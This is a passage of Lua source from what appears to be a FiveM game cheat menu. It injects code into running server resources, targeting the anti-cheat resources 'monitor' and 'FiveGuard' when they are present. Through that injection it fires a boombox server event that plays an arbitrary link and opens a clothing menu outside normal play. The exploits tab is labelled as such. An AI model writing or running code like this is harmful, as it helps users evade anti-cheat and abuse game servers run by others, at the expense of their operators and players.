        local coords = GetEntityCoords(ped)
        local currentRadioId = "machoradio" .. GetPlayerServerId(PlayerId())
        local link = "]] .. link .. [["
        local volume = ]] .. volume .. [[
        local distance = ]] .. distance .. [[.0

        TriggerServerEvent("wasabi_boombox:soundStatus", "play", currentRadioId, {
            position = coords,
            link = link,
            volume = volume / 100,
            distance = distance
        })
    ]])
    
    MachoMenuNotification("Boombox", "Music Sent to Server!")
end)

MachoMenuButton(OtherExploitsTabSections[1], "Clothing Menu", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        local function OpenClothingShop()
            TriggerEvent('illenium-appearance:client:openClothingShopMenu', true)
        end
        
        OpenClothingShop()
    ]])
end)
